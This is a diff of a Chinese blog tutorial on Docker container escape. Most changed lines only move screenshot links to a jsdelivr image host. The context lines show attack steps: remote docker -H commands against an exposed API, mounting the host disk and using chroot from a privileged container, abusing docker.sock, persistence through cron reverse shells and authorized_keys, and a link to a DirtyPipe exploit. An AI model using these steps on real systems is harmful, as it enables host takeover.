@@ -63,7 +63,7 @@ Docker容器逃逸的利用思路是：
 **举例** ：
 
 测试环境 ：docker nginx:latest 镜像  
-![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/c506c6c78b8c4a7da494ab274ef5e805.png)  
+![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/a11c3a1eb54af8c3b8c67d5ec325d682.png)  
 可以发现，部分通过测试，部分没有，但大体来讲能判断目前处于一个docker环境。
 
 #### 1.基于API 漏洞
@@ -118,7 +118,7 @@ http://x.x.x.x:2375/info
 js123
 ```
 
-![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/08409e4ff5cd4844ae3a6170d662c007.png)
+![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/4189766b8135f2a316d3cc7cf39e9f37.png)
 
 **docker命令远程管理** ：
 
@@ -131,7 +131,7 @@ docker -H tcp://x.x.x.x:2375 exec -it e7d97caf249d /bin/bash
 bash123
 ```
 
-![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/a5d96c29793a470d807e662ecd3e4dad.png)
+![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/4eab47fc32b6efdbd3574f6b1c49427c.png)
 
 **获取宿主机权限** ：
 
@@ -186,10 +186,10 @@ shell12345678910
 ```
 
 攻击机监听 7777 端口，执行完脚本，耐心等待一会才会反弹shell到攻击机，大约一分多钟时间。  
-![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/580ca362378c49ef8011b27a3078e7ce.png)  
-![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/6d95ec6b758a4fc8a2bead2e954a7f0a.png)  
+![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/09c91f3acf6e08b1027234716c556a64.png)  
+![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/a4b15c8e2b38ea9d0e67355953fe65d3.png)  
 可以看的宿主机的 /etc/crontab 文件被写入了如下的定时任务。  
-![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/157b1352be514869941dad3121797e99.png)
+![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/47b55129dc55874d170d70547e5b0d0f.png)
 
 ##### 利用方法2
 
@@ -202,7 +202,7 @@ docker -H tcp://192.168.56.131 pull alpine
 bash1
 ```
 
-![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/6012e71c861d40dfb5bc289a1f5115fa.png)  
+![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/c2bd541cc1d4049ce268bdc3a3f9ad18.png)  
 使用拉取的镜像启动一个新的容器，以 sh 或者 /bin/bash 作为shell启动，并且将该宿主机的根目录挂在到容器的 /mnt 目录下
 
 ```bash
@@ -211,7 +211,7 @@ bash1
 ```
 
 执行之后会返回一个该容器宿主机的shell  
-![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/7040cc14fce44274a432a56d7d389472.png)  
+![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/7148961bff522565c1a38a2760c3cc0d.png)  
 进入 /mnt 目录下即可逃逸到宿主机，在容器内执行命令，将反弹shell的脚本写入到宿主机定时任务文件。
 
 ```bash
@@ -226,7 +226,7 @@ bash12
 ```
 
 监听端口，获取对方宿主机shell。  
-![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/724279dfb1094012bed4063cb29b892e.png)
+![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/499cb91976b21d041100f4ab43838097.png)
 
 ##### 权限维持
 
@@ -238,7 +238,7 @@ bash1
 ```
 
 一直回车，执行结束会生成 公钥 和 私钥  
-![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/cec42f62ccdc43f8a4d116daa2987f0d.png)  
+![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/bde9ae5f1379b1e71ea6c9b89541de50.png)  
 写入宿主机的 `/root/.ssh/authorized_keys` 文件  
   
 使用 ssh 登录
@@ -248,7 +248,7 @@ ssh -i id_ed25519 root@192.168.56.131
 bash1
 ```
 
-![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/0db922029d9d4c028b6a1b0452bdccb0.png)
+![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/3428ebfe008f4fa65adb24491fb80eed.png)
 
 #### 2.基于危险配置的逃逸
 
@@ -267,7 +267,7 @@ cat /proc/self/status |grep Cap
 bash1
 ```
 
-![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/e974bf5937a843d59c4fa0fa5caff9e7.png)  
+![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/d100460a792ed800e887cb669606eb8a.png)  
 通过特权模式起的容器 CapEff 掩码值为：0000001fffffffff （或0000003fffffffff）
 
 ##### 利用方法：
@@ -280,12 +280,12 @@ bash1
 ```
 
 进入容器，使用 fdisk -l 命令查看磁盘文件（容器没有 fdisk 可以用 `df -h` ）  
-![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/2dcaf820ac4643e08cb04f7c2e55149c.png)  
+![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/2d70da1998d3930850e40d45c52c9396.png)  
 一般都是最大的那个  
 新建一个目录： `mkdir /test`  
 挂载磁盘到新建目录： `mount /dev/sda2 /test`  
 切换到宿主根目录： `chroot /test`  
-![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/708fa78dee394a2ebd771e203df2640e.png)  
+![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/20248580fb3e2c5267c3411f24b625ff.png)  
 到这里已经成功逃逸了，然后就是常规的反弹 shell 了。
 
 先切换到容器 shell，写入
@@ -297,7 +297,7 @@ bash1
 
 成功写入并反弹shell  
   
-![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/9bb2c6cd69de4e85b52f5ac7a67e28fd.png)
+![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/05a39e71892394ea68750152a1ebae89.png)
 
 #### 3.基于危险挂载的逃逸
 
@@ -327,7 +327,7 @@ find / -name *.sock
 bash1
 ```
 
-![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/2c03b17493ca4208af02f6f54f151553.png)
+![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/3cc7ff55c456bf93c6b3e34777bbdd4a.png)
 
 ##### 漏洞利用
 
@@ -346,7 +346,7 @@ docker -H unix://var/run/docker.sock images
 bash1
 ```
 
-![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/8b8de4f086b746f5b2da45280c1611b0.png)  
+![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/738620de485fe66ea23a7cc07447d752.png)  
 在该 docker 中运行一个 docker 如上面的 ubuntu，然后把宿主机根目录挂载进来。
 
 ```bash
@@ -355,8 +355,8 @@ bash1
 ```
 
 可以看到已经换容器了。  
-![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/ebeb616bcf83416cbb04111a8c125330.png)  
-![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/24fc5f7bcd974fdcbf3d4cbf5c5be79d.png)  
+![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/238633e2bb2699160078fb9aa5a6b0f5.png)  
+![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/ea7da83c6867bb8e584f44aa404e6e1e.png)  
 逃逸成功，剩下操作与上面基于特权的一样，写计划任务。
 
 #### 4.基于程序漏洞的逃逸
@@ -479,19 +479,19 @@ https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit
 
 举报
 
- [![](https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/Group.png) 点击体验  
-DeepSeekR1满血版](https://ai.csdn.net/?utm_source=cknow_pc_blogdetail&spm=1001.2101.3001.10583) 隐藏侧栏 ![程序员都在用的中文IT技术交流社区](https://g.csdnimg.cn/side-toolbar/3.6/images/qr_app.png)
+ [![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/4b5d638b57b796bf4228e36a12fd3244.png) 点击体验  
+DeepSeekR1满血版](https://ai.csdn.net/?utm_source=cknow_pc_blogdetail&spm=1001.2101.3001.10583) 隐藏侧栏 ![程序员都在用的中文IT技术交流社区](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/6ddf638effe61d927f03a0789e73f41e.png)
 
 程序员都在用的中文IT技术交流社区
 
-![专业的中文 IT 技术社区，与千万技术人共成长](https://g.csdnimg.cn/side-toolbar/3.6/images/qr_wechat.png)
+![专业的中文 IT 技术社区，与千万技术人共成长](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/4832e9a5e9fe3a702f3d81b1ce7c9ca3.png)
 
 专业的中文 IT 技术社区，与千万技术人共成长
 
-![关注【CSDN】视频号，行业资讯、技术分享精彩不断，直播好礼送不停！](https://g.csdnimg.cn/side-toolbar/3.6/images/qr_video.png)
+![关注【CSDN】视频号，行业资讯、技术分享精彩不断，直播好礼送不停！](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/e311c5ce3170b9f4471a19010a5c3bd8.png)
 
 关注【CSDN】视频号，行业资讯、技术分享精彩不断，直播好礼送不停！
 
 客服 返回顶部
 
-![](https://i-blog.csdnimg.cn/direct/c506c6c78b8c4a7da494ab274ef5e805.png) ![](https://i-blog.csdnimg.cn/direct/08409e4ff5cd4844ae3a6170d662c007.png) ![](https://i-blog.csdnimg.cn/direct/a5d96c29793a470d807e662ecd3e4dad.png) ![](https://i-blog.csdnimg.cn/direct/580ca362378c49ef8011b27a3078e7ce.png) ![](https://i-blog.csdnimg.cn/direct/6d95ec6b758a4fc8a2bead2e954a7f0a.png) ![](https://i-blog.csdnimg.cn/direct/157b1352be514869941dad3121797e99.png) ![](https://i-blog.csdnimg.cn/direct/6012e71c861d40dfb5bc289a1f5115fa.png) ![](https://i-blog.csdnimg.cn/direct/7040cc14fce44274a432a56d7d389472.png) ![](https://i-blog.csdnimg.cn/direct/724279dfb1094012bed4063cb29b892e.png) ![](https://i-blog.csdnimg.cn/direct/cec42f62ccdc43f8a4d116daa2987f0d.png) ![](https://i-blog.csdnimg.cn/direct/0db922029d9d4c028b6a1b0452bdccb0.png) ![](https://i-blog.csdnimg.cn/direct/e974bf5937a843d59c4fa0fa5caff9e7.png) ![](https://i-blog.csdnimg.cn/direct/2dcaf820ac4643e08cb04f7c2e55149c.png) ![](https://i-blog.csdnimg.cn/direct/708fa78dee394a2ebd771e203df2640e.png) ![](https://i-blog.csdnimg.cn/direct/9bb2c6cd69de4e85b52f5ac7a67e28fd.png) ![](https://i-blog.csdnimg.cn/direct/2c03b17493ca4208af02f6f54f151553.png) ![](https://i-blog.csdnimg.cn/direct/8b8de4f086b746f5b2da45280c1611b0.png) ![](https://i-blog.csdnimg.cn/direct/ebeb616bcf83416cbb04111a8c125330.png) ![](https://i-blog.csdnimg.cn/direct/24fc5f7bcd974fdcbf3d4cbf5c5be79d.png)
+![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/a11c3a1eb54af8c3b8c67d5ec325d682.png) ![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/4189766b8135f2a316d3cc7cf39e9f37.png) ![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/4eab47fc32b6efdbd3574f6b1c49427c.png) ![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/09c91f3acf6e08b1027234716c556a64.png) ![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/a4b15c8e2b38ea9d0e67355953fe65d3.png) ![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/47b55129dc55874d170d70547e5b0d0f.png) ![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/c2bd541cc1d4049ce268bdc3a3f9ad18.png) ![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/7148961bff522565c1a38a2760c3cc0d.png) ![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/499cb91976b21d041100f4ab43838097.png) ![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/bde9ae5f1379b1e71ea6c9b89541de50.png) ![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/3428ebfe008f4fa65adb24491fb80eed.png) ![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/d100460a792ed800e887cb669606eb8a.png) ![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/2d70da1998d3930850e40d45c52c9396.png) ![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/20248580fb3e2c5267c3411f24b625ff.png) ![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/05a39e71892394ea68750152a1ebae89.png) ![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/3cc7ff55c456bf93c6b3e34777bbdd4a.png) ![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/738620de485fe66ea23a7cc07447d752.png) ![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/238633e2bb2699160078fb9aa5a6b0f5.png) ![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/ea7da83c6867bb8e584f44aa404e6e1e.png)
